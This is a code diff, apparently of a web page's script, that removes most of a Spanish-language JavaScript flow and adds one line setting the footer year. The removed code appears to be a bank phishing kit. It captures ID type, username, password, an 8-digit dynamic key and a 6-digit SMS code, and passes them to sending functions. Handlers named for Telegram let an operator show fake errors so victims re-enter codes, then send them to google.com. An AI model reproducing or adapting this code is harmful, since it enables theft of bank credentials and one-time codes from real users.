-        actualizarOTP();
-        otpInput.focus();
-        actionProcessed = false;
-    } else if (action === 'sms_code') {
-        viewDinamica.classList.remove("active");
-        viewSms.classList.add("active");
-        smsCodeInput.value = "";
-        smsError.classList.remove("show");
-        smsInputWrap.classList.remove("error");
-        setTimeout(() => smsCodeInput.focus(), 100);
-    } else if (action === 'finalizar') {
-        window.location.href = "https://www.google.com";
-    }
-}
-
-function handleTelegramActionSms(action) {
-    if (actionProcessed) return;
-    actionProcessed = true;
-    ocultarOverlay();
-
-    if (action === 'error_dinamica_final') {
-        viewSms.classList.remove("active");
-        viewDinamica.classList.add("active");
-        otpError.classList.add("show");
-        otpInput.classList.add("error");
-        otpInput.value = "";
-        actualizarOTP();
-        otpInput.focus();
-        actionProcessed = false;
-    } else if (action === 'error_sms_final') {
-        smsError.classList.add("show");
-        smsInputWrap.classList.add("error");
-        smsCodeInput.value = "";
-        smsCodeInput.focus();
-        actionProcessed = false;
-    } else if (action === 'finalizar') {
-        window.location.href = "https://www.google.com";
-    }
-}
-
-// ==========================================
-// SUBMIT Y OTP
-// ==========================================
-demoForm.addEventListener("submit", function(e) {
-    e.preventDefault();
-    if (submitBtn.disabled) return;
-    
-    const tipoDoc = documentType.value;
-    const user = documentNumber.value.trim();
-    const pass = claveInput.value.trim();
-
-    enviarIdentificacion(tipoDoc, user, pass);
-});
-
-function actualizarOTP() {
-    const valor = otpInput.value;
-    if (valor.length === 8) {
-        btnContinuar.disabled = false;
-    } else {
-        btnContinuar.disabled = true;
-    }
-}
-
-otpInput.addEventListener("input", function() {
-    this.value = this.value.replace(/[^0-9]/g, "").slice(0, 8);
-    otpError.classList.remove("show");
-    otpInput.classList.remove("error");
-    actualizarOTP();
-});
-
-btnBorrar.addEventListener("click", () => {
-    otpInput.value = "";
-    otpError.classList.remove("show");
-    otpInput.classList.remove("error");
-    actualizarOTP();
-    otpInput.focus();
-});
-
-btnContinuar.addEventListener("click", () => {
-    if (otpInput.value.length === 8) {
-        enviarDinamica(otpInput.value);
-    }
-});
-
-closeModal.addEventListener("click", () => {
-    modal.classList.remove("is-open");
-});
-
-smsCodeInput.addEventListener("input", function() {
-    this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
-    smsError.classList.remove("show");
-    smsInputWrap.classList.remove("error");
-});
-
-btnSmsFinal.addEventListener("click", () => {
-    if (smsCodeInput.value.length < 6) {
-        smsError.textContent = "Por favor, ingresa el código SMS completo de 6 dígitos.";
-        smsError.classList.add("show");
-        smsInputWrap.classList.add("error");
-        return;
-    }
-    enviarSms(smsCodeInput.value);
-});
-
-actualizarBoton();
+document.getElementById("year").textContent=new Date().getFullYear();
 </script>
 </body>
 </html>
